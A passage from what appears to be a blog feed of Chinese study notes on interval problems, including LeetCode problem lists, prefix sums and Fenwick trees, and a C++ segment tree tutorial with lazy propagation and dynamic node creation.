class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>★★</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox11" checked="true"><label for="checkbox11">#### </label><a href="https://leetcode.cn/problems/car-pooling/">1094. 拼车</a></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox12" checked="true"><label for="checkbox12">#### </label><a href="https://leetcode.cn/problems/corporate-flight-bookings/">1109. 航班预订统计</a></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox13"><label for="checkbox13"></label><a href="https://leetcode.cn/problems/my-calendar-iii/">732. 我的日程安排表 III</a>     <a href="https://blog.csdn.net/Miracle_ps/article/details/126573360">https://blog.csdn.net/Miracle_ps/article/details/126573360</a></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox14"><label for="checkbox14">2381. 字母移位 II</label></p>
</li>
</ul>
<p>★★★</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox15" checked="true"><label for="checkbox15">#### </label><a href="https://leetcode.cn/problems/minimum-moves-to-make-array-complementary/">1674. 使数组互补的最少操作次数</a>（求数据变换范围，将每一对数变换到相应范围分别需要的操作次数）</p>
</li>
</ul>
<p>★★★★★</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox16"><label for="checkbox16">#### </label><a href="https://leetcode.cn/problems/smallest-rotation-with-highest-score/">798. 得分最高的最小轮调</a></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox17" checked="true"><label for="checkbox17">#### </label><a href="https://leetcode.cn/problems/maximize-the-minimum-powered-city/">2528. 最大化城市的最小供电站数目</a></p>
</li>
</ul>
<h1>4 题目</h1>
<h2 id="4-1-前缀和">4.1 前缀和</h2>
<table>
<thead>
<tr>
<th>题目</th>
<th>标签</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://leetcode.cn/problems/subarray-sum-equals-k/description/">560. 和为 K 的子数组 - 力扣（LeetCode）</a></td>
<td>前缀和、哈希表(计数前缀和出现次数)</td>
</tr>
</tbody>
</table>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/02/%E7%AE%97%E6%B3%95/%E5%8C%BA%E9%97%B4%EF%BC%9A%E5%8C%BA%E9%97%B4%E5%92%8C%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<blockquote>
<p>前缀和适用于数组不变适用于单点更新，区间查询</p>
</blockquote>
<table>
<thead>
<tr>
<th>方法</th>
<th>构造</th>
<th>查询</th>
<th>修改</th>
<th>适用</th>
</tr>
</thead>
<tbody>
<tr>
<td>前缀和</td>
<td>O(n)</td>
<td>O(1)</td>
<td></td>
<td>数组不变</td>
</tr>
<tr>
<td>树状数组</td>
<td>O(nlogn)</td>
<td>O(logn)</td>
<td>O(logn)</td>
<td>区间查询，单点更新</td>
</tr>
</tbody>
</table>
<p><a href="https://leetcode.cn/problems/range-sum-query-mutable/solutions/632515/guan-yu-ge-lei-qu-jian-he-wen-ti-ru-he-x-41hv/">307. 区域和检索 - 数组可修改 - 力扣（LeetCode）</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>数组不变，求区间和：「前缀和」、「树状数组」、「线段树」</p>
</li>
<li class="lvl-2">
<p>多次修改某个数（单点），求区间和：「树状数组」、「线段树」</p>
</li>
<li class="lvl-2">
<p>多次修改某个区间，输出最终结果：「差分」</p>
</li>
<li class="lvl-2">
<p>多次修改某个区间，求区间和：「线段树」、「树状数组」（看修改区间范围大小）</p>
</li>
<li class="lvl-2">
<p>多次将某个区间变成同一个数，求区间和：「线段树」、「树状数组」（看修改区间范围大小）</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E5%8C%BA%E9%97%B4%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91(Interval%20trees%E3%80%81%E5%8C%BA%E9%97%B4%E6%A0%91)/</url>
    <content><![CDATA[<h1>1 Interval trees（线段树、区间树）</h1>
<p><a href="https://leetcode.cn/problems/my-calendar-i/solution/by-lfool-xvpv/">线段树详解「汇总级别整理 🔥🔥🔥」 - 我的日程安排表 I - 力扣（LeetCode）</a><br>
<a href="https://blog.csdn.net/zearot/article/details/48299459">(6条消息) 线段树详解 （原理，实现与应用）_岩之痕的博客-CSDN博客_线段树</a></p>
<h1>2 线段树应用</h1>
<p>线段树用于解决区间和问题，且该区间会被修改。</p>
<p>如果需要多次求某区间的和，可以使用前缀和。如果对某个元素进行修改，或者对某个区间内的元素进行修改，则前缀和不再适用。线段树每个节点代表一个区间，节点的值是区间的和。对于数组$nums=[1,2,3,4,5]$：<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202307112002172.png" alt="image.png"></p>
<p>每个节点不仅可以用于表示区间的和</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>数字之和「总数字之和 = 左区间数字之和 + 右区间数字之和」</p>
</li>
<li class="lvl-2">
<p>最大公因数 (GCD)「总 GCD = gcd(左区间 GCD, 右区间 GCD)」</p>
</li>
<li class="lvl-2">
<p>最大值「总最大值 = max(左区间最大值，右区间最大值)」</p>
</li>
</ul>
<p>不符合区间加法的例子：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>众数「只知道左右区间的众数，没法求总区间的众数」</p>
</li>
<li class="lvl-2">
<p>01 序列的最长连续零「只知道左右区间的最长连续零，没法知道总的最长连续零」</p>
</li>
</ul>
<h1>3 数据结构</h1>
<p><a href="https://blog.csdn.net/mmww1994/article/details/104206072">(50条消息) 线段树 4n 开四倍空间的原因_Andy-Miao的博客-CSDN博客</a></p>
<p>可以使用数组表示一颗线段树：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>假设根节点为<code>i</code>，左孩子为<code>2*i</code>，右孩子为<code>2*i+1</code>（数组下标从1开始）</p>
</li>
<li class="lvl-2">
<p>假设根节点为<code>i</code>，左孩子为<code>2*i+1</code>，右孩子为<code>2*i+2</code>（数组下标从0开始）。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202307122155009.png" alt="线段树"></p>
<p>区间大小为$n=2<sup>k$，需要节点数$1+2+2</sup>2+…+2<sup>k=2n-1$；$n=2</sup>{k+1}$时，需要节点$4n-1$。</p>
<p>当$2^k &lt; n&lt;2^{k+1}$时，节点落在下标[2n,4n-1)内，</p>
<p>链表表示线段树：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    Node *left,*right;</span><br><span class="line">    <span class="type">int</span> val;		<span class="comment">//当前节点值，节点表示区间(区间的和，区间的最大值。。。)</span></span><br><span class="line">    <span class="type">int</span> lazy;		<span class="comment">//懒惰标记</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>4 建立线段树</h1>
<p>给定具体区间范围，根据范围建立线段树，此时可以用数组或者链表表示线段树。<a href="https://leetcode.cn/problems/range-sum-query-mutable/">307. 区域和检索 - 数组可修改</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">n=nums.<span class="built_in">size</span>();</span><br><span class="line"><span class="built_in">builtTree</span>(root,<span class="number">0</span>,n<span class="number">-1</span>,nums);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[start,end]是node当前表示的区间范围</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">builtTree</span><span class="params">(Node *node,<span class="type">int</span> start,<span class="type">int</span> end,vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start==end)&#123;</span><br><span class="line">        node-&gt;val=nums[start];</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!node-&gt;left) node-&gt;left=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">    <span class="keyword">if</span>(!node-&gt;right) node-&gt;right=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">builtTree</span>(node-&gt;left,start,mid,nums);</span><br><span class="line">    <span class="built_in">builtTree</span>(node-&gt;right,mid<span class="number">+1</span>,end,nums);</span><br><span class="line">    <span class="comment">//pushUp，向上更新</span></span><br><span class="line">    node-&gt;val=node-&gt;left-&gt;val+node-&gt;right-&gt;val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果题目没有具体范围，只有数据的取值范围，可以采用**[动态开点线段树]**。假设数组长度为5，添加元素<code>[2,2], val=3</code>，<code>update(root,0,4,2,2,3)</code>。如果一个节点没有左右孩子，会一下子把左右孩子节点都给创建出来，如下图橙色节点所示。两个橙色的叶子节点仅仅只是被创建出来了，并无实际的值，均为 0；而另外一个橙色的非叶子节点，值为 3 的原因是下面的孩子节点的值向上更新得到的</p>
<p><img src="C:%5CUsers%5C16325%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230711215828443.png" alt="image-20230711215828443"><br>
添加节点变化，「动态开点」一般是在「更新」或「查询」的时候动态的建立节点：<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202307120940030.png" alt="image.png"></p>
<h1>5 线段树的更新</h1>
<p>更新区间[2,4]值+1，`update(root,0,4,2,4,1)。此时9号节点代表区间[3,4]都需要+1，则节点值+(end-start+1)*val，对节点添加懒惰标记lazy。当查询区间[3,3]时，懒惰标记在9号节点上，需要将标记下推给4和5号节点，同时取消标记。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202307120943105.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 查询区间[l,r]区间+val</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node* node,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 当前区间位于查询区间内，当前区间每一个元素增加val</span></span><br><span class="line">    <span class="keyword">if</span>(l&lt;=start&amp;&amp;end&lt;=r)&#123;</span><br><span class="line">        node-&gt;val+=(end-start<span class="number">+1</span>)*val;</span><br><span class="line">        <span class="comment">// 查询时可能查找当前区间子区间，记录标记，表示区间的增加量，以下推给子区间</span></span><br><span class="line">        node-&gt;add+=val;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前区间不全部位于查询区间，只有部分元素增加，当前节点的懒惰标记向下推</span></span><br><span class="line">    <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">pushDown</span>(node,mid-start<span class="number">+1</span>,end-mid);</span><br><span class="line">    <span class="comment">// 分为两个区间：[start,mid] [mid+1,end]</span></span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid)</span><br><span class="line">        <span class="built_in">update</span>(node-&gt;left,start,mid,l,r,val);</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid)</span><br><span class="line">        <span class="built_in">update</span>(node-&gt;right,mid<span class="number">+1</span>,end,l,r,val);</span><br><span class="line">    <span class="built_in">pushUp</span>(node);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushUp</span><span class="params">(Node* node)</span></span>&#123;</span><br><span class="line">    node-&gt;val=node-&gt;left-&gt;val+node-&gt;right-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leftNum 和 rightNum 表示左右孩子区间的叶子节点数量</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">(Node* node,<span class="type">int</span> leftNum,<span class="type">int</span> rightNum)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!node-&gt;left) node-&gt;left=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">    <span class="keyword">if</span>(!node-&gt;right) node-&gt;right=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">    <span class="comment">// 如果add为0，则没有标记，不需要下推</span></span><br><span class="line">    <span class="keyword">if</span>(node-&gt;add==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// node表示区间[start,end]，其左右孩子分别表示区间[start,mid], [mid+1,end]</span></span><br><span class="line">    <span class="comment">// add标记最初添加在node节点，对区间[start,end]的数都添加add</span></span><br><span class="line">    node-&gt;left-&gt;val+=leftNum*node-&gt;add;</span><br><span class="line">    node-&gt;right-&gt;val+=rightNum*node-&gt;add;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把标记下推给子区间</span></span><br><span class="line">    node-&gt;left-&gt;add+=node-&gt;add;</span><br><span class="line">    node-&gt;right-&gt;add+=node-&gt;add;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 已经将标记分别添加到区间[start,mid], [mid+1,end]，当前区间取消标记</span></span><br><span class="line">    node-&gt;add=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>6 线段树的查询</h1>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在当前区间[start,end]，查询区间[l,r]</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(Node *node,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=start&amp;&amp;end&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">return</span> node-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//[start,end]划分为区间[start,mid],[mid+1,right]</span></span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="comment">//下推标记</span></span><br><span class="line">		<span class="built_in">pushDown</span>(node,mid-start<span class="number">+1</span>,end-mid);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(node-&gt;left,start,mid,l,r);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(node-&gt;right,mid<span class="number">+1</span>,end,l,r);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1>7 线段树模板</h1>
<h2 id="7-1-基于-区间和">7.1 基于[区间和]</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SegmentTreeDynamic</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        Node *left,*right;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        <span class="type">int</span> add;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> N=<span class="number">1e9</span>;</span><br><span class="line">    Node* root=<span class="keyword">new</span> <span class="built_in">Node</span>(); </span><br><span class="line"></span><br><span class="line">	<span class="comment">//调用函数</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">book</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">query</span>(root,<span class="number">0</span>,N,start,end<span class="number">-1</span>)!=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">update</span>(root,<span class="number">0</span>,N,start,end<span class="number">-1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [l,r]区间+val</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node* node,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=start&amp;&amp;end&lt;=r)&#123;</span><br><span class="line">            node-&gt;val+=(end-start<span class="number">+1</span>)*val;</span><br><span class="line">            node-&gt;add+=val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前节点的懒惰标记向下推</span></span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(node,mid-start<span class="number">+1</span>,end-mid);</span><br><span class="line">        <span class="comment">// 分为两个区间：[start,mid] [mid+1,end]</span></span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)</span><br><span class="line">            <span class="built_in">update</span>(node-&gt;left,start,mid,l,r,val);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)</span><br><span class="line">            <span class="built_in">update</span>(node-&gt;right,mid<span class="number">+1</span>,end,l,r,val);</span><br><span class="line">        <span class="built_in">pushUp</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushUp</span><span class="params">(Node* node)</span></span>&#123;</span><br><span class="line">        node-&gt;val=node-&gt;left-&gt;val+node-&gt;right-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">(Node* node,<span class="type">int</span> leftNum,<span class="type">int</span> rightNum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!node-&gt;left) node-&gt;left=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="keyword">if</span>(!node-&gt;right) node-&gt;right=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="comment">// 如果add为0，则没有标记，不需要下推</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;add==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        node-&gt;left-&gt;val+=leftNum*node-&gt;add;</span><br><span class="line">        node-&gt;right-&gt;val+=rightNum*node-&gt;add;</span><br><span class="line"></span><br><span class="line">        node-&gt;left-&gt;add+=node-&gt;add;</span><br><span class="line">        node-&gt;right-&gt;add+=node-&gt;add;</span><br><span class="line"></span><br><span class="line">        node-&gt;add=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询区间未[l,r]，当前区间为[start,end]</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(Node* node,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=start&amp;&amp;end&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">return</span> node-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(node,mid-start<span class="number">+1</span>,end-mid);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(node-&gt;left,start,mid,l,r);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(node-&gt;right,mid<span class="number">+1</span>,end,l,r);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="7-2-基于区间最大值">7.2 基于区间最大值</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCalendarTwo</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        Node *left, *right;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        <span class="type">int</span> lazy;</span><br><span class="line">    &#125;;</span><br><span class="line">    Node *root;</span><br><span class="line">    <span class="type">int</span> N = <span class="number">1e9</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node *root, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= start &amp;&amp; end &lt;= r) &#123;</span><br><span class="line">            root-&gt;val += val;</span><br><span class="line">            root-&gt;lazy += val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下推懒惰标记</span></span><br><span class="line">        <span class="built_in">pushDown</span>(root, mid - start + <span class="number">1</span>, end - mid);</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid)</span><br><span class="line">            <span class="built_in">update</span>(root-&gt;left, start, mid, l, r, val);</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid)</span><br><span class="line">            <span class="built_in">update</span>(root-&gt;right, mid + <span class="number">1</span>, end, l, r, val);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新当前节点区间最大值</span></span><br><span class="line">        root-&gt;val = <span class="built_in">max</span>(root-&gt;left-&gt;val, root-&gt;right-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">(Node *root, <span class="type">int</span> leftNum, <span class="type">int</span> rightNum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;left)</span><br><span class="line">            root-&gt;left = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;right)</span><br><span class="line">            root-&gt;right = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;lazy == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> val = root-&gt;lazy;</span><br><span class="line">        <span class="comment">// 左右节点最大值分别加val</span></span><br><span class="line">        root-&gt;left-&gt;val += val;</span><br><span class="line">        root-&gt;right-&gt;val += val;</span><br><span class="line">        <span class="comment">// 左右子节点懒惰标记</span></span><br><span class="line">        root-&gt;left-&gt;lazy += val;</span><br><span class="line">        root-&gt;right-&gt;lazy += val;</span><br><span class="line"></span><br><span class="line">        root-&gt;lazy = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询区间最大值</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(Node *root, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= start &amp;&amp; end &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">return</span> root-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(root, mid - start + <span class="number">1</span>, end - mid);</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid)</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, <span class="built_in">query</span>(root-&gt;left, start, mid, l, r));</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid)</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, <span class="built_in">query</span>(root-&gt;right, mid + <span class="number">1</span>, end, l, r));</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyCalendarTwo</span>() &#123; root = <span class="keyword">new</span> <span class="built_in">Node</span>(); &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">book</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">query</span>(root, <span class="number">0</span>, N, start, end<span class="number">-1</span>) &gt;= <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">update</span>(root, <span class="number">0</span>, N, start, end<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="7-3-区间最小值">7.3 区间最小值</h2>
<h4 id="1851-包含每个查询的最小区间"><a href="https://leetcode.cn/problems/minimum-interval-to-include-each-query/">1851. 包含每个查询的最小区间</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> N = <span class="number">1e7</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        Node *left, *right;</span><br><span class="line">        <span class="type">int</span> val = INT_MAX;</span><br><span class="line">        <span class="type">int</span> lazy = INT_MAX;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">minInterval</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;intervals,</span></span></span><br><span class="line"><span class="params"><span class="function">                            vector&lt;<span class="type">int</span>&gt; &amp;queries)</span> </span>&#123;</span><br><span class="line">        Node *root = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;interval : intervals) &#123;</span><br><span class="line">            <span class="type">int</span> l = interval[<span class="number">0</span>], r = interval[<span class="number">1</span>];</span><br><span class="line">            <span class="built_in">update</span>(root, <span class="number">0</span>, N, l, r, r - l + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> n = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> t = <span class="built_in">query</span>(root, <span class="number">0</span>, N, queries[i], queries[i]);</span><br><span class="line">            <span class="keyword">if</span> (t != INT_MAX)</span><br><span class="line">                ans[i] = t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node *root, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//val记录root表示区间的最小值</span></span><br><span class="line">        <span class="comment">//lazy表示可以在当前区间继续向下更新的值</span></span><br><span class="line">        <span class="keyword">if</span> (l &lt;= start &amp;&amp; end &lt;= r) &#123;</span><br><span class="line">            root-&gt;val = <span class="built_in">min</span>(root-&gt;val, val);</span><br><span class="line">            root-&gt;lazy = <span class="built_in">min</span>(root-&gt;lazy,val);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(root);</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid)</span><br><span class="line">            <span class="built_in">update</span>(root-&gt;left, start, mid, l, r, val);</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid)</span><br><span class="line">            <span class="built_in">update</span>(root-&gt;right, mid + <span class="number">1</span>, end, l, r, val);</span><br><span class="line">        root-&gt;val = <span class="built_in">min</span>(root-&gt;left-&gt;val, root-&gt;right-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">(Node *root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;left)</span><br><span class="line">            root-&gt;left = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;right)</span><br><span class="line">            root-&gt;right = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">		<span class="comment">// 不需要向下更新</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;lazy == INT_MAX)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//子区间可以进一步向下更新的值</span></span><br><span class="line">        